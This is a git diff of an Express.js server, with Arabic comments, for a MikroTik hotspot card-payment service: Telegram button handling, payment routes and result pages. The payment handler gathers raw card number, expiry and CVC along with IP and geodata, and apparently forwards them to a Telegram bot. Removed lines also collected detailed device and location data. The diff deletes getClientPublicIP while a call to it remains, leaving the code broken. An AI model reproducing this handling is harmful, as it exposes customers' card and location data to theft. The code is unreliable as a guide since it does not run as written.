@@ -14,11 +14,8 @@ const webhookRouter = require("./webhook");
 const { disableUserQueue } = require("./mikrotik");
 const { processPaymentAndCreateCard } = require("./mikrotikService");
 const { generateContributionHtmlPage } = require('./contributionMessages');
-const { generateWaitPageHtml } = require('./waitPage'); 
-const { generateSuccessPageHtml } = require('./successPage'); // استدعاء صفحة النجاح المنفصلة
-const { generateFailPageHtml } = require('./failPage');     // استدعاء صفحة الفشل المنفصلة
-
-// استدعاء ملف الدعم المباشر (Chat Support)
+const { generateSuccessPageHtml } = require('./successPage');
+const { generateFailPageHtml } = require('./failPage');
 const chatSupport = require('./chat_support');
 
 const app = express();
@@ -41,10 +38,10 @@ global.generatedCardsMap = global.generatedCardsMap || new Map();
 // تهيئة Socket.io للدعم المباشر
 chatSupport.initSocket(io);
 
-// إعداد Multer لاستقبال الصور والملفات المرفوعة في الشات
+// إعداد Multer
 const upload = multer();
 
-// تنظيف دوري للذاكرة المؤقتة كل نصف ساعة
+// تنظيف دوري للذاكرة المؤقتة
 setInterval(() => {
   const oneHourAgo = Date.now() - (60 * 60 * 1000);
   for (let [key, value] of global.generatedCardsMap.entries()) {
@@ -64,102 +61,55 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
-function getClientPublicIP(req) {
-  return (
-    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
-    req.socket?.remoteAddress ||
-    req.ip ||
-    "غير متوفر"
-  );
-}
-
 // ==========================================
-// 💬 مسارات الدعم الفني المباشر (Chat Support API)
-// ==========================================
-app.post('/api/support/message', upload.single('image'), (req, res) => {
-  chatSupport.handleClientMessage(req, res, chatSupport.sendSupportChatMessage);
-});
-
-app.get('/api/support/messages/:clientId', (req, res) => {
-  const clientId = req.params.clientId;
-  const messages = chatSupport.getStoredMessages(clientId);
-  res.json({ success: true, messages });
-});
-
-// ==========================================
-// 🤖 Webhook الخاص بتليجرام (معالجة الأزرار التفاعلية والردود)
+// 📡 استقبال ضغط الأزرار من التليجرام
 // ==========================================
 app.post('/telegram-webhook', async (req, res) => {
-  try {
-    const update = req.body;
+  const update = req.body;
 
-    // أولاً: معالجة الردود الخاصة بالأزرار التفاعلية (Callback Queries)
-    if (update.callback_query) {
-      const callbackQuery = update.callback_query;
-      const data = callbackQuery.data;
-      const chatId = callbackQuery.message.chat.id;
-      const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  if (update.callback_query) {
+    const data = update.callback_query.data;
 
-      // زر تأكيد المساهمة
-      if (data.startsWith("contribution_")) {
-        const [ , txId, amount ] = data.split("_");
-        global.generatedCardsMap.set(txId, { isContribution: true, amount, createdAt: new Date() });
+    // زر المساهمة
+    if (data.startsWith("contribution_")) {
+      const [ , txId, amount ] = data.split("_");
+      global.generatedCardsMap.set(txId, { isContribution: true, amount });
 
-        if (botToken) {
-          await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            chat_id: chatId,
-            text: `✅ تم تحويل المعاملة ${txId} إلى مساهمة بنجاح.`
-          });
-        }
-      }
-
-      // زر إصدار الكارت
-      if (data.startsWith("issuecard_")) {
-        const [ , txId, amount ] = data.split("_");
-        const result = await processPaymentAndCreateCard(amount, "branch2", txId);
-
-        if (result.success) {
-          const cardPayload = {
-            code: result.cardCode,
-            packageName: result.packageName,
-            amount,
-            branchKey: result.branchKey,
-            branchName: result.branchName || BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
-            createdAt: new Date()
-          };
-          global.generatedCardsMap.set(txId, cardPayload);
-
-          if (botToken) {
-            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              chat_id: chatId,
-              text: `🎫 تم إصدار الكارت للمعاملة ${txId} بنجاح:\n<code>${cardPayload.code}</code>`,
-              parse_mode: "HTML"
-            });
-          }
-        } else {
-          if (botToken) {
-            await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              chat_id: chatId,
-              text: `❌ فشل إصدار الكارت للمعاملة ${txId} من الميكروتيك.`
-            });
-          }
-        }
-      }
-    } 
-    // ثانياً: معالجة الردود النصية الخاصة بالشات الدعم الفني
-    else {
-      await chatSupport.handleTelegramReply(update);
+      await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        chat_id: update.callback_query.message.chat.id,
+        text: `✅ تم تحويل المعاملة ${txId} إلى مساهمة`
+      });
     }
 
-    res.sendStatus(200);
-  } catch (err) {
-    console.error("❌ خطأ في معالجة تليجرام Webhook:", err.message);
-    res.sendStatus(500);
+    // زر إصدار الكارت
+    if (data.startsWith("issuecard_")) {
+      const [ , txId, amount ] = data.split("_");
+      const result = await processPaymentAndCreateCard(amount, "branch2", txId);
+
+      if (result.success) {
+        const cardPayload = {
+          code: result.cardCode,
+          packageName: result.packageName,
+          amount,
+          branchKey: result.branchKey,
+          branchName: result.branchName,
+          createdAt: new Date()
+        };
+        global.generatedCardsMap.set(txId, cardPayload);
+
+        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          chat_id: update.callback_query.message.chat.id,
+          text: `🎫 تم إصدار الكارت للمعاملة ${txId}: ${cardPayload.code}`
+        });
+      }
+    }
   }
+
+  res.sendStatus(200);
 });
 
 // ==========================================
-// 💳 مسارات المدفوعات وباقي الخدمة
+// 💳 مسارات المدفوعات
 // ==========================================
 async function handlePaymentRequest(req, res) {
   try {
@@ -167,9 +117,7 @@ async function handlePaymentRequest(req, res) {
     const {
       phone, user_phone, phoneNumber, amount, payment_method, method,
       number, name, expiry, cvc, card_data, save_card, clientID, clientId,
-      publicIP, lat, lon, city, country, battery, batteryInfo, deviceModel,
-      deviceRAM, cpuCores, deviceType, screenSize, userTimeZone, lang,
-      geoData, branch, branch_key
+      publicIP, geoData, branch, branch_key
     } = data;
 
     if (!amount && Object.keys(data).length === 0) {
@@ -199,19 +147,7 @@ async function handlePaymentRequest(req, res) {
         save_card: save_card === "tokenize" || save_card === "نعم"
       },
       clientID: clientID || clientId || "غير متوفر",
-      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req),
-      lat: lat || (geoData && geoData.lat) || "غير متوفر",
-      lon: lon || (geoData && geoData.lon) || "غير متوفر",
-      city: city || (geoData && geoData.city) || "غير متوفر",
-      country: country || (geoData && geoData.country) || "غير متوفر",
-      battery: battery || batteryInfo || "غير متوفر",
-      deviceModel: deviceModel || req.headers["user-agent"] || "غير متوفر",
-      deviceRAM: deviceRAM || "غير متوفر",
-      cpuCores: cpuCores || "غير متوفر",
-      deviceType: deviceType || "غير متوفر",
-      screenSize: screenSize || "غير متوفر",
-      userTimeZone: userTimeZone || "غير متوفر",
-      lang: lang || req.headers["accept-language"]?.split(",")[0] || "غير متوفر"
+      publicIP: publicIP || (geoData && geoData.publicIP) || getClientPublicIP(req)
     };
 
     if (typeof sendTelegramMessage === "function") {
@@ -221,84 +157,30 @@ async function handlePaymentRequest(req, res) {
     const result = await processPayment(userPhone, payAmount, selectedMethod, selectedBranch);
 
     if (result.type === "redirect") {
-      if (req.method === "POST" && req.headers["content-type"]?.includes("application/json")) {
-        return res.json({ payment_url: result.url });
-      }
       return res.redirect(result.url);
     } else if (result.type === "html") {
       return res.send(result.content);
     } else {
-      return res.send(generateWaitPageHtml(transactionId, NETWORK_URL));
+      return res.redirect(`/success?id=${transactionId}&branch=${selectedBranch}`);
     }
   } catch (err) {
     console.error("❌ خطأ في معالجة طلب الدفع:", err.response?.data || err.message);
-    if (req.headers["content-type"]?.includes("application/json")) {
-      return res.status(500).json({ error: `حدث خطأ أثناء معالجة عملية الدفع: ${err.message}` });
-    }
-    res.status(500).send(`حدث خطأ أثناء معالجة عملية الدفع: ${err.message}`);
+    res.redirect(`/fail?data_message=${encodeURIComponent(err.message)}`);
   }
 }
 
 app.get("/api/pay", handlePaymentRequest);
 app.post("/api/pay", handlePaymentRequest);
 
-app.get("/api/test-create-card", async (req, res) => {
-  const secretKey = req.query.secret;
-  
-  if (!secretKey || secretKey !== process.env.TEST_SECRET_KEY) {
-    return res.status(403).json({ 
-      success: false, 
-      message: "⚠️ غير مسموح لك بالوصول لهذا الرابط التجريبي. مفتاح الحماية غير صحيح أو مفقود." 
-    });
-  }
-
-  try {
-    const amount = req.query.amount || "5";
-    const rawTarget = req.query.branch || req.query.branch_key || "branch2";
-    const targetBranch = BRANCH_NAMES[rawTarget] ? rawTarget : "branch2";
-    const testTxId = "TEST_" + Date.now();
-
-    const result = await processPaymentAndCreateCard(amount, targetBranch, testTxId);
-
-    if (result.success && !result.isCustomAmount) {
-      const cardPayload = {
-        code: result.cardCode,
-        packageName: result.packageName,
-        amount: parseFloat(amount),
-        phone: "01000000000",
-        branchKey: result.branchKey,
-        branchName: BRANCH_NAMES[result.branchKey] || BRANCH_NAMES.branch2,
-        createdAt: new Date()
-      };
-
-      global.generatedCardsMap.set(testTxId, cardPayload);
-
-      return res.json({
-        success: true,
-        message: `✅ تم إضافة الكارت إلى الميكروتيك بنجاح وتوليده لفرع (${result.branchKey}) تحت الحماية!`,
-        data: result,
-        successPageLink: `/success?merchant_order_id=${testTxId}&branch=${result.branchKey}`
-      });
-    } else {
-      return res.json({
-        success: false,
-        message: "⚠️ فشل توليد الكارت من الميكروتيك",
-        details: result
-      });
-    }
-  } catch (error) {
-    console.error("❌ [TEST ERROR]:", error.message);
-    res.status(500).json({ success: false, error: error.message });
-  }
-});
-
+// ✅ صفحة المساهمة
 app.get("/contribution-success", (req, res) => {
-  const amount = req.query.amount || req.query.price || 150;
-  const transactionId = req.query.tx || req.query.id || req.query.order || 'TRX-DEFAULT';
+  const amount = req.query.amount || 150;
+  const transactionId = req.query.tx || req.query.id || 'TRX-DEFAULT';
   const htmlContent = generateContributionHtmlPage(amount, transactionId);
   res.send(htmlContent);
 });
 
+// ✅ فحص حالة المعاملة
 app.get("/api/check-voucher/:txId", (req, res) => {
   const txId = String(req.params.txId || "").trim();
   
@@ -306,52 +188,26 @@ app.get("/api/check-voucher/:txId", (req, res) => {
     return res.json({ success: false, message: "رقم المعاملة غير صالح" });
   }
 
-  if (global.generatedCardsMap) {
-    if (global.generatedCardsMap.has(txId)) {
-      return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
-    }
-    
-    for (let [key, value] of global.generatedCardsMap.entries()) {
-      if (String(key).includes(txId) || txId.includes(String(key))) {
-        return res.json({ success: true, data: value });
-      }
-    }
+  if (global.generatedCardsMap.has(txId)) {
+    return res.json({ success: true, data: global.generatedCardsMap.get(txId) });
   }
 
-  return res.json({ 
-    success: false, 
-    message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." 
-  });
+  return res.json({ success: false, message: "جاري تأكيد عملية الدفع وتوليد الكارت من السيرفر..." });
 });
 
-app.post("/api/disable-queue", async (req, res) => {
-  try {
-    const { username } = req.body;
-    if (typeof disableUserQueue === "function") {
-      const result = await disableUserQueue(username);
-      return res.json(result);
-    }
-    return res.json({ success: true, message: "تم استقبال الطلب" });
-  } catch (err) {
-    console.error("❌ خطأ في تعطيل الـ Queue:", err.message);
-    return res.status(500).json({ success: false, error: "حدث خطأ في الخادم الداخلي" });
-  }
-});
-
-// استدعاء واجهة النجاح المنفصلة وتمرير البيانات والفروع بذكاء
+// ✅ صفحة النجاح
 app.get("/success", (req, res) => {
-  const transactionId = req.query.id || req.query.order || req.query.transaction_id || req.query.merchant_order_id || "TX_" + Date.now();
+  const transactionId = req.query.id || "TX_" + Date.now();
   const queryBranch = req.query.branch || "";
-  
   const pageHtml = generateSuccessPageHtml(transactionId, NETWORK_URL, queryBranch);
-  return res.send(pageHtml);
+  res.send(pageHtml);
 });
 
-// استدعاء واجهة الفشل المنفصلة
+// ✅ صفحة الفشل
 app.get("/fail", (req, res) => {
   const errorMessage = req.query.data_message || "حدثت مشكلة أثناء عملية الدفع، حاول مرة أخرى.";
   const pageHtml = generateFailPageHtml(errorMessage);
-  return res.send(pageHtml);
+  res.send(pageHtml);
 });
 
 app.use("/", webhookRouter);
